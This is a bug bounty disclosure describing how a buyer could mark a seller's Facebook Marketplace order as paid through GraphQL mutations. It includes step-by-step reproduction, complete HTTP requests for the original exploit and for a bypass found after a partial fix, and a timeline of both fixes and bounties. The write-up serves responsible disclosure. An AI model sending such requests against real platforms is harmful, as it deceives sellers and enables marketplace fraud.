---
title: Mark Marketplace Item as Paid as a Buyer
description: Buyer-side GraphQL mutations allowed changing a Marketplace listing to 'Paid', deceiving sellers and disabling the 'Mark as paid' control.
date: 2025-8-3
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

### 🧾 Description
A buyer could use GraphQL mutations to mark someone else’s Marketplace order as paid, even though this action should be limited to the seller only.  
The result misleads the seller (UI shows the order as *Paid* and hides the Mark as paid button), enabling potential fraud / social engineering and DoS on seller workflow.

---

## ⚙️ Steps to Reproduce

**Users:** UserA (Seller / Victim) — UserB (Buyer / Attacker)  

1. **UserA** creates a new listing at `https://www.facebook.com/marketplace/create` and shares the item URL with **UserB**.  
2. **UserB** opens `https://www.facebook.com/marketplace/item/{ID}` then clicks Message to open a Messenger thread with **UserA** about this item.  
3. **UserA** sees **Mark as paid** and other order actions available in the thread UI. **UserB** does **not** normally have this option.  
4. **UserB** obtains his own **business/android access token** and the **thread/message ID** for the Marketplace chat.  
5. Using the **Graph API Explorer** (or any HTTP client), **UserB** sends a **POST** to GraphQL with the following parameters:

### 📤 Request
```http
POST /graphql HTTP/1.1
Host: graph.facebook.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: https://www.graph.facebook.com
Connection: close

&doc_id=5583150721696906&variables={"input": {"client_mutation_id": "1","actor_id": "1","is_mark_as_paid": true,"message_thread_id": "{ID_MESSAGE}","should_update_thread_label": false,"surface": "MESSENGER_LIGHTSPEED_BANNER"}}&access_token={UserB_access_token}
```

### ✅ Response
```json
{
  "data": {
    "profile_selling_invoice_create": { "client_mutation_id": "1" }
  },
  "extensions": { "is_final": true }
}
```

**Observed:** The listing/order is marked **Paid** from the **buyer** side. The seller’s UI loses the **Mark as paid** button and sees the order as paid.

---

## 🔁 Follow‑up / Bypass Variant (After Partial Fix)

During re‑testing, another GraphQL flow still allowed the buyer to reach the **Paid** state in the seller’s thread context by using a different `doc_id` and variables (requires **item ID** and **message thread ID**).

### 1) Retrieve the Marketplace thread info by Item ID
```http
POST /graphql HTTP/1.1
Host: graph.facebook.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: https://www.graph.facebook.com
Connection: close

&doc_id=4299671400131216&variables={"cappedScale": 2,"id": "{ID_MARKETPLACE_ID}","MarketplaceProductImage_LARGE_SIZE": 189,"MarketplaceProductImage_SMALL_SIZE": 137,"MarketplaceProductItemMessageThread_STICKER_SIZE": 39,"showCombinedInbox": false,"showInboxTaggingRedesign": true,"useUnifiedInboxStyle": true,"shouldUseServerManagementActionsForAATest": false,"shouldUseNewInventoryActionSheet": false,"filterLabels": [],"scale": 2.625}&access_token={UserB_access_token}
```

### 2) Mark as Paid via alternative mutation
```http
POST /graphql HTTP/1.1
Host: graph.facebook.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: https://www.graph.facebook.com
Connection: close

&doc_id=3163078603755877&variables={"input": {"client_mutation_id": "45","actor_id": "0","message_thread_graphql_ids": ["{ID_MessageThread}"],"referral_surface": "unknown","surface": "mark_as_paid_multi_select_page"}}&access_token={UserB_access_token}
```

**Observed:** The seller’s **Mark as paid** control disappears and the conversation shows **Paid** in UI; the buyer cannot revert it, leaving the seller with a misleading state.

---

## 🧱 Expected Behavior
Only the **seller** (authorized party) can mark the order as **Paid**. Buyer actions must not affect the seller’s order state.

---
## Timeline

- **First Report:** November 13, 2021
- **Triaged:** November 16, 2021
- **Fixed:** December 8, 2021
- **Reward:** December 8, 2021 - Bounty awarded: $3,000
- **Second Report:** December 14, 2021
- **Triaged:** December 14, 2021
- **Fixed:** December 31, 2021
- **Reward:** Januray 20, 2022 - Bounty awarded: $3,000

---
